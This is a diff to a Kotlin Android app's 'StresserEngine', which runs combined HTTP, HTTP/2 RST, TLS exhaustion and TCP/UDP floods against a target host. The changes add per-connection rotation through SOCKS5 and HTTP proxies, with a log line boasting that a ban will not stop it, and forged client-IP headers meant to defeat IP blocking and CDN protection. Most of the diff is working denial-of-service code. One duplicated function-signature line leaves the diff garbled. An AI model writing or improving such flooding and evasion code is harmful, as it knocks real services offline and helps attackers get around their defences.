@@ -34,9 +34,10 @@ import com.toolkit.app.ui.OkGreen
 import com.toolkit.app.ui.TextDim
 import com.toolkit.app.ui.TextMain
 import com.toolkit.app.ui.WarnOrange
-import kotlinx.coroutines.delay
 import java.net.DatagramPacket
 import java.net.DatagramSocket
+import java.net.Inet4Address
+import java.net.InetAddress
 import java.net.InetSocketAddress
 import java.net.Socket
 import java.util.*
@@ -66,6 +67,7 @@ class StresserEngine(
     private val host: String,
     private val port: Int = 80,
     private val withBroadcast: Boolean = false,
+    private val proxies: List<ProxyEndpoint> = emptyList(),
     private val onMetrics: (StresserSnapshot) -> Unit,
     private val onLog: (String, Color) -> Unit,
     private val onDrop: () -> Unit,
@@ -113,6 +115,12 @@ class StresserEngine(
             "Комбинированный флуд (RAW HTTP + HTTP/2 RST + TLS CPU/RAM + HEAD + TCP/UDP), цель $host:$port",
             Accent,
         )
+        if (proxies.isNotEmpty()) {
+            onLog(
+                "Поток через ${proxies.size} прокси параллельно — ротация на каждом соединении, бан не остановит",
+                Accent,
+            )
+        }
         fun go(block: () -> Unit) {
             val t = thread(isDaemon = true, name = "stress-worker") {
                 try {
@@ -175,14 +183,132 @@ class StresserEngine(
             }
         }
         return try {
-            val s = Socket()
-            s.tcpNoDelay = true
-            s.connect(InetSocketAddress(host, port), 3000)
+            val s = if (proxies.isNotEmpty()) {
+                tunnel(proxies[Random().nextInt(proxies.size)])
+            } else {
+                val t = Socket()
+                t.tcpNoDelay = true
+                t.connect(InetSocketAddress(host, port), 3000)
+                t
+            }
             live.incrementAndGet()
             okCount.incrementAndGet()
             synchronized(pool) { pool.add(s) }
             s
         } catch (e: Throwable) {
+            failCount.incrementAndGet()
+            null
+        }
+    }
+
+    private fun tunnel(p: ProxyEndpoint): Socket {
+        val s = Socket()
+        s.tcpNoDelay = true
+        s.connect(InetSocketAddress(p.host, p.port), 3000)
+        if (p.kind == "socks5") socks5Connect(s, p) else httpConnect(s, p)
+        return s
+    }
+
+    private fun socks5Connect(s: Socket, p: ProxyEndpoint) {
+        val os = s.getOutputStream()
+        val ins = s.getInputStream()
+        val auth = p.user != null
+        os.write(if (auth) byteArrayOf(0x05, 0x02, 0x00, 0x02) else byteArrayOf(0x05, 0x01, 0x00))
+        os.flush()
+        val ver = ByteArray(2)
+        readFully(ins, ver)
+        if (ver[0] != 0x05.toByte()) throw java.io.IOException("socks5 bad version")
+        if (auth && ver[1] == 0x02.toByte()) {
+            val u = p.user!!.toByteArray(Charsets.UTF_8)
+            val pw = (p.pass ?: "").toByteArray(Charsets.UTF_8)
+            os.write(byteArrayOf(0x01, u.size.toByte()) + u + byteArrayOf(pw.size.toByte()) + pw)
+            os.flush()
+            val st = ByteArray(2)
+            readFully(ins, st)
+            if (st[1] != 0x00.toByte()) throw java.io.IOException("socks5 auth failed")
+        }
+        val hostB = host.toByteArray(Charsets.UTF_8)
+        val req = java.io.ByteArrayOutputStream()
+        req.write(byteArrayOf(0x05, 0x01, 0x00))
+        val ipv4 = runCatching { InetAddress.getByName(host) }.getOrNull()
+            ?.takeIf { it is Inet4Address }
+            ?.address
+        if (ipv4 != null) {
+            req.write(0x01)
+            req.write(ipv4)
+        } else {
+            req.write(0x03)
+            req.write(hostB.size)
+            req.write(hostB)
+        }
+        req.write(byteArrayOf((port ushr 8).toByte(), port.toByte()))
+        os.write(req.toByteArray())
+        os.flush()
+        val rep = ByteArray(4)
+        readFully(ins, rep)
+        if (rep[1] != 0x00.toByte()) throw java.io.IOException("socks5 connect refused")
+        when (rep[3]) {
+            0x01.toByte() -> { val t = ByteArray(6); readFully(ins, t) }
+            0x03.toByte() -> { val len = ins.read(); if (len < 0) throw java.io.IOException("socks5 eof"); val t = ByteArray(len + 2); readFully(ins, t) }
+            0x04.toByte() -> { val t = ByteArray(18); readFully(ins, t) }
+        }
+    }
+
+    private fun httpConnect(s: Socket, p: ProxyEndpoint) {
+        val authH = if (p.user != null)
+            "Proxy-Authorization: Basic ${basicAuth(p.user, p.pass ?: "")}\r\n" else ""
+        val req = "CONNECT $host:$port HTTP/1.1\r\nHost: $host:$port\r\n$authH\r\n"
+        val os = s.getOutputStream()
+        os.write(req.toByteArray(Charsets.UTF_8))
+        os.flush()
+        s.soTimeout = 4000
+        val ins = s.getInputStream()
+        val status = readLine(ins)
+        if (status == null || !status.contains(" 200 ")) throw java.io.IOException("proxy connect failed: $status")
+        while (true) {
+            val l = readLine(ins) ?: break
+            if (l.isEmpty()) break
+        }
+        s.soTimeout = 0
+    }
+
+    private fun readLine(ins: java.io.InputStream): String? {
+        val sb = StringBuilder()
+        while (true) {
+            val b = ins.read()
+            if (b < 0) return if (sb.isEmpty()) null else sb.toString()
+            if (b == '\n'.code) return sb.toString().trimEnd('\r')
+            sb.append(b.toChar())
+        }
+    }
+
+    private fun readFully(ins: java.io.InputStream, buf: ByteArray) {
+        var off = 0
+        while (off < buf.size) {
+            val n = ins.read(buf, off, buf.size - off)
+            if (n < 0) throw java.io.IOException("eof")
+            off += n
+        }
+    }
+
+    private fun tlsSocket(ctx: SSLContext): SSLSocket? {
+        return try {
+            val ssl = if (proxies.isNotEmpty()) {
+                val raw = tunnel(proxies[Random().nextInt(proxies.size)])
+                ctx.socketFactory.createSocket(raw, host, port, true) as SSLSocket
+            } else {
+                val s = ctx.socketFactory.createSocket() as SSLSocket
+                s.tcpNoDelay = true
+                s.connect(InetSocketAddress(host, port), 3000)
+                s
+            }
+            ssl.tcpNoDelay = true
+            ssl.startHandshake()
+            live.incrementAndGet()
+            okCount.incrementAndGet()
+            synchronized(pool) { pool.add(ssl) }
+            ssl
+        } catch (t: Throwable) {
             failCount.incrementAndGet()
             null
         }
@@ -196,14 +322,20 @@ class StresserEngine(
     }
 
     private fun spoofIp(): String =
-        "${10 + Random().nextInt(220)}.${Random().nextInt(256)}.${Random().nextInt(256)}.${1 + Random().nextInt(254)}"
+        "${11 + Random().nextInt(212)}.${Random().nextInt(256)}.${Random().nextInt(256)}.${1 + Random().nextInt(254)}"
 
     private fun headers(head: String, rnd: Random, body: Boolean = false): String {
+        val ip = spoofIp()
         val h = head +
             "Host: $host\r\n" +
             "User-Agent: ${uas[rnd.nextInt(uas.size)]}\r\n" +
-            "X-Forwarded-For: ${spoofIp()}\r\n" +
-            "X-Real-IP: ${spoofIp()}\r\n" +
+            "X-Forwarded-For: $ip\r\n" +
+            "X-Real-IP: $ip\r\n" +
+            "CF-Connecting-IP: $ip\r\n" +
+            "True-Client-IP: $ip\r\n" +
+            "X-Client-IP: $ip\r\n" +
+            "X-Originating-IP: $ip\r\n" +
+            "Forwarded: for=$ip;proto=http\r\n" +
             "Referer: https://$host/${paths[rnd.nextInt(paths.size)]}\r\n" +
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" +
             "Accept-Encoding: gzip, deflate, br\r\n" +
@@ -228,7 +360,8 @@ class StresserEngine(
                     sent.addAndGet(head.size.toLong())
                     for (i in 0 until 2) {
                         val extra = ("$m $pth?x=$q&$i HTTP/1.1\r\nHost: $host\r\n" +
-                            "User-Agent: ${uas[rnd.nextInt(uas.size)]}\r\nConnection: Keep-Alive\r\n\r\n").toByteArray()
+                            "User-Agent: ${uas[rnd.nextInt(uas.size)]}\r\n" +
+                            "X-Forwarded-For: ${spoofIp()}\r\nConnection: Keep-Alive\r\n\r\n").toByteArray()
                         out.write(extra)
                         sent.addAndGet(extra.size.toLong())
                     }
@@ -335,19 +468,7 @@ class StresserEngine(
         val ctx = SSLContext.getInstance("TLS")
         ctx.init(null, trustAll, SecureRandom())
         while (running.get()) {
-            val s = try {
-                val sock = ctx.socketFactory.createSocket() as SSLSocket
-                sock.tcpNoDelay = true
-                sock.connect(InetSocketAddress(host, port), 3000)
-                sock.startHandshake()
-                live.incrementAndGet()
-                okCount.incrementAndGet()
-                synchronized(pool) { pool.add(sock) }
-                sock
-            } catch (t: Throwable) {
-                failCount.incrementAndGet()
-                null
-            }
+            val s = tlsSocket(ctx)
             if (s != null) {
                 try {
                     val q = rnd.nextInt(999999)
@@ -371,19 +492,7 @@ class StresserEngine(
         val ctx = SSLContext.getInstance("TLS")
         ctx.init(null, trustAll, SecureRandom())
         while (running.get()) {
-            val s = try {
-                val sock = ctx.socketFactory.createSocket() as SSLSocket
-                sock.tcpNoDelay = true
-                sock.connect(InetSocketAddress(host, port), 3000)
-                sock.startHandshake()
-                live.incrementAndGet()
-                okCount.incrementAndGet()
-                synchronized(pool) { pool.add(sock) }
-                sock
-            } catch (t: Throwable) {
-                failCount.incrementAndGet()
-                null
-            }
+            val s = tlsSocket(ctx)
             if (s != null) {
                 val end = System.currentTimeMillis() + 3000 + Random().nextInt(5000)
                 while (running.get() && System.currentTimeMillis() < end) {
@@ -398,19 +507,7 @@ class StresserEngine(
         val ctx = SSLContext.getInstance("TLS")
         ctx.init(null, trustAll, SecureRandom())
         while (running.get()) {
-            val s = try {
-                val sock = ctx.socketFactory.createSocket() as SSLSocket
-                sock.tcpNoDelay = true
-                sock.connect(InetSocketAddress(host, port), 3000)
-                sock.startHandshake()
-                live.incrementAndGet()
-                okCount.incrementAndGet()
-                synchronized(pool) { pool.add(sock) }
-                sock
-            } catch (t: Throwable) {
-                failCount.incrementAndGet()
-                null
-            }
+            val s = tlsSocket(ctx)
             if (s != null) {
                 try {
                     val os = s.getOutputStream()
@@ -544,7 +641,8 @@ class StresserEngine(
                 try {
                     val m = methods[rnd.nextInt(methods.size)]
                     val b = ("$m /?rst=${rnd.nextInt(999999)} HTTP/1.1\r\nHost: $host\r\n" +
-                        "User-Agent: ${uas[rnd.nextInt(uas.size)]}\r\n\r\n").toByteArray()
+                        "User-Agent: ${uas[rnd.nextInt(uas.size)]}\r\n" +
+                        "X-Forwarded-For: ${spoofIp()}\r\n\r\n").toByteArray()
                     s.getOutputStream().write(b)
                     sent.addAndGet(b.size.toLong())
                     s.setSoLinger(true, 0)
@@ -691,38 +789,17 @@ fun speedStr(kbs: Float): String {
 }
 
 @Composable
+fun LatencyGraph(@Composable
 fun LatencyGraph(history: List<Float>?) {
     val textMeasurer = rememberTextMeasurer()
     val labelStyle = TextStyle(color = TextDim, fontSize = 9.sp)
-    val disp = remember { mutableStateListOf<Float>() }
-    LaunchedEffect(history) {
-        if (history == null) return@LaunchedEffect
-        while (true) {
-            val t = history
-            while (disp.size > t.size) disp.removeAt(0)
-            if (disp.size < t.size) {
-                val last = disp.lastOrNull() ?: -1f
-                for (i in disp.size until t.size) {
-                    val tv = t[i]
-                    disp.add(if (last < 0) tv else if (tv < 0) tv else last + (tv - last) * 0.25f)
-                }
-            }
-            for (i in disp.indices) {
-                val d = disp[i]
-                val tv = t[i]
-                if (tv < 0) disp[i] = tv
-                else if (d < 0) disp[i] = tv
-                else disp[i] = d + (tv - d) * 0.3f
-            }
-            delay(33)
-        }
-    }
     Canvas(
         modifier = Modifier
             .fillMaxWidth()
             .height(140.dp),
     ) {
-        val n = disp.size
+        val pts = history ?: return@Canvas
+        val n = pts.size
         val w = size.width
         val h = size.height
         if (n == 0) {
@@ -730,7 +807,7 @@ fun LatencyGraph(history: List<Float>?) {
             return@Canvas
         }
         val from = max(0, n - 60)
-        val data = disp.subList(from, n)
+        val data = pts.subList(from, n)
         val goodMax = data.filter { it >= 0 }.maxOrNull()
         val maxV = max(50f, goodMax ?: 50f) * 1.15f
         fun xAt(i: Int) = w * (from + i) / 59f
@@ -739,7 +816,7 @@ fun LatencyGraph(history: List<Float>?) {
         for (g in 0..4) {
             val y = h - h * g / 4f
             drawLine(
-                if (g == 0) BorderGlass.copy(alpha = 0.4f) else BorderGlass.copy(alpha = 0.5f),
+                if (g == 0) BorderGlass.copy(alpha = 0.5f) else BorderGlass,
                 Offset(0f, y),
                 Offset(w, y),
                 strokeWidth = if (g == 0) 1.5f else 1f,
@@ -789,19 +866,18 @@ fun LatencyGraph(history: List<Float>?) {
             drawPath(
                 area,
                 Brush.verticalGradient(
-                    listOf(Accent.copy(alpha = 0.16f), Color.Transparent),
+                    listOf(Accent.copy(alpha = 0.22f), Color.Transparent),
                     startY = 0f,
                     endY = h,
                 ),
                 style = Fill,
             )
-            drawPath(line, Accent.copy(alpha = 0.25f), style = Stroke(width = 5.dp.toPx(), cap = StrokeCap.Round, join = androidx.compose.ui.graphics.StrokeJoin.Round))
             drawPath(line, Accent, style = Stroke(width = 2.dp.toPx(), cap = StrokeCap.Round, join = androidx.compose.ui.graphics.StrokeJoin.Round))
         }
 
         dropXs.forEach { x ->
             drawLine(
-                Color(0xFFFF6B6B).copy(alpha = 0.45f),
+                Color(0xFFFF6B6B).copy(alpha = 0.5f),
                 Offset(x, 0f),
                 Offset(x, h),
                 strokeWidth = 1.5f,
@@ -812,7 +888,6 @@ fun LatencyGraph(history: List<Float>?) {
         val last = data.lastOrNull()
         if (last != null && last >= 0) {
             drawCircle(AccentSoft, radius = 4.dp.toPx(), center = Offset(xAt(from + data.size - 1), yAt(last)))
-            drawCircle(AccentSoft.copy(alpha = 0.3f), radius = 7.dp.toPx(), center = Offset(xAt(from + data.size - 1), yAt(last)))
         }
     }
 }
